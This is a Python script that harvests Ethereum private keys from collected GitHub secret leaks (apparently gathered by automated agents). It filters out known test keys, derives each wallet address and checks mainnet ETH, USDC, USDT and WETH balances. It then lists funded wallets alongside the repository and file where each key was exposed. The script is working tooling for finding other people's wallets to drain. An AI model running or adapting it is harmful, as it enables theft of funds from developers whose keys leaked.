#!/usr/bin/env python3
"""
Check ALL EVM private keys found across all runs.
Handles: 0x+64hex, raw 64hex (no 0x), WALLET_PRIVATE_KEY, ETH_PRIVATE_KEY, DEPLOYER_PRIVATE_KEY.
Derives ETH address, checks mainnet balance + USDC/USDT via public RPC.
"""
import json, glob, re, time, urllib.request, urllib.error
from eth_account import Account

# All patterns that yield a 32-byte hex EVM private key
KEY_PATTERNS = [
    re.compile(r'(?:PRIVATE_KEY|ETH_PRIVATE_KEY|WALLET_PRIVATE_KEY|DEPLOYER_PRIVATE_KEY'
               r'|MEV_BOT_KEY|SEARCHER_KEY|FLASHBOT_KEY|OPERATOR_KEY|MINTER_PRIVATE_KEY'
               r'|MAINNET_PRIVATE_KEY|PROD_PRIVATE_KEY)\s*[=:"\'\s]*(0x[a-fA-F0-9]{64})', re.I),
    re.compile(r'(?:PRIVATE_KEY|ETH_PRIVATE_KEY|WALLET_PRIVATE_KEY|DEPLOYER_PRIVATE_KEY'
               r'|MEV_BOT_KEY|SEARCHER_KEY|MAINNET_PRIVATE_KEY|PROD_PRIVATE_KEY)\s*[=:"\'\s]*'
               r'([a-fA-F0-9]{64})\b', re.I),
    # ethers.js / web3.py inline
    re.compile(r'new ethers\.Wallet\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?', re.I),
    re.compile(r'from_key\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?', re.I),
    re.compile(r'privateKeyToAccount\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?', re.I),
]

# Known worthless keys — hardhat accounts 0-19 and Ganache defaults
HARDHAT = {
    'ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
    '59c6995e998f97a5a0049b46a0f4151951417fe8a0ab6699cee2932cd8efb234',
    '5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a',
    '7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6',
    '47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a',
    '8b3a350cf5c34c9194e9daf28d4ced8df99a41951c7e63d79e87e2d73e6f4d9a',
    '92db14e403b83dfe39a39cad18e05ba90bd79ee9c8ae38b02d8b10dc7a28f1f0',
    '4bbbf85ce3377467af0e4aa4a0f2d35659a567e08bb15d49d1a6ccd6ddfb07e7',
    'dbda1821b80551c9d49113405c7d601b1de0d1d18064d35a22d0fc0f3db3cec7',
    '2a871d0798f97d7984a04842e449e3f6d16e8c56b1d73b58e7b49a02e45b1f49',
    'f214f2b2cd398c806f84e317254e931e3c3d9b2b44ec6f3d8a8c7f3b4d5d62ef',
    # Ganache defaults
    '4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d',
    '6cbed15c793ce57650b9877cf6fa156fbef513c4e6134f022a85b1ffdd59b2a1',
    '6370fd033278c143179d81c5526140625662b8daa446c22ee2d73db3707e620c',
    '646f1ce2fdad0e6deeeb5c7e8e5543bdde65e86029e2fd9fc169899c440a7913',
    'add53f9a7e588d003326d1cbf9e4a43c061aadd9bc938c843a79e7b09d174898',
    '395df67f0c2d2d9fe1ad08d1bc8b6627011959b79c53d7dd6a3536a33ab8a4fd',
    'e485d098507f54e7733a205420dfddbe58db035fa577fc294ebd14db90767a52',
    'a453611d9419d0e56f499079478fd72c37b251a94bfde4d19872c44cf65386e3',
    '829e924fdf021ba3dbbc4225edfece9aca04b929d6e75613329ca6f1d31c0bb4',
    'b0057716d5917badaf347b293df7c23e87b99f6a1cfb13df4fb7e28e59cfc3a5',
    # foundry/forge defaults
    '1234567890123456789012345678901234567890123456789012345678901234',
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
}

fake_words = ['your','here','xxxx','1234','test','example','dummy','placeholder',
              'enter','fill','replace','insert','add_your','put_your']
def is_fake(key_hex):
    kl = key_hex.lower().lstrip('0x')
    if kl in HARDHAT: return True
    if len(set(kl)) < 4: return True  # all same chars
    # suspiciously sequential
    if kl == ''.join(hex(i%16)[2:]*4 for i in range(16))[:64]: return True
    return False

RPC_URLS = [
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.public.blastapi.io',
    'https://rpc.ankr.com/eth',
    'https://cloudflare-eth.com',
]

def rpc_call(method, params):
    body = json.dumps({'jsonrpc':'2.0','id':1,'method':method,'params':params}).encode()
    for rpc in RPC_URLS:
        try:
            req = urllib.request.Request(rpc, data=body,
                headers={'Content-Type':'application/json','User-Agent':'curl/7.0'})
            r = urllib.request.urlopen(req, timeout=10)
            data = json.loads(r.read())
            result = data.get('result')
            if result is not None:
                return result
        except:
            continue
    return None

def get_eth_balance(addr):
    res = rpc_call('eth_getBalance', [addr, 'latest'])
    if res is None: return None
    return int(res, 16) / 1e18

def get_token_balance(addr, token_contract):
    # ERC-20 balanceOf(address) = 0x70a08231
    data = '0x70a08231' + '000000000000000000000000' + addr[2:]
    res = rpc_call('eth_call', [{'to': token_contract, 'data': data}, 'latest'])
    if not res or res == '0x': return 0
    try: return int(res, 16)
    except: return 0

USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
WETH = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'

seen_keys = set()
funded = []
checked = 0

for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            full_text = ' '.join(e.get('secrets', []))

            for pat in KEY_PATTERNS:
                for m in pat.finditer(full_text):
                    raw = m.group(1).strip()
                    key_hex = raw.lower().lstrip('0x')
                    if len(key_hex) != 64: continue
                    if is_fake(key_hex): continue
                    if key_hex in seen_keys: continue
                    seen_keys.add(key_hex)

                    try:
                        acct = Account.from_key('0x' + key_hex)
                        addr = acct.address
                    except Exception:
                        continue

                    eth = get_eth_balance(addr)
                    checked += 1
                    time.sleep(0.15)

                    if eth is None:
                        print('RPC_ERR | ' + addr[:12] + '... | ' + e['repo'])
                        continue

                    if eth > 0.001:
                        usdc = get_token_balance(addr, USDC) / 1e6
                        usdt = get_token_balance(addr, USDT) / 1e6
                        weth = get_token_balance(addr, WETH) / 1e18
                        time.sleep(0.2)
                        print('*** FUNDED *** ' + addr)
                        print('  ETH:  ' + str(round(eth, 6)))
                        if usdc > 0.01: print('  USDC: ' + str(round(usdc, 2)))
                        if usdt > 0.01: print('  USDT: ' + str(round(usdt, 2)))
                        if weth > 0.001: print('  WETH: ' + str(round(weth, 4)))
                        print('  repo: ' + e['repo'] + '/' + e['path'])
                        funded.append({'addr': addr, 'eth': eth, 'usdc': usdc, 'usdt': usdt,
                                       'repo': e['repo'] + '/' + e['path']})
                    elif eth > 0:
                        print('dust | ' + addr[:14] + '... ' + str(round(eth,6)) + ' ETH | ' + e['repo'])
                    else:
                        print('zero | ' + addr[:14] + '... | ' + e['repo'])

        except Exception as ex:
            pass

print('\n' + '='*60)
print('Checked ' + str(checked) + ' unique EVM keys')
print('FUNDED (>0.001 ETH): ' + str(len(funded)))
for w in funded:
    print('  ' + w['addr'] + ' | ' + str(round(w['eth'],4)) + ' ETH | ' + str(round(w['usdc'],2)) + ' USDC')
    print('  ' + w['repo'])
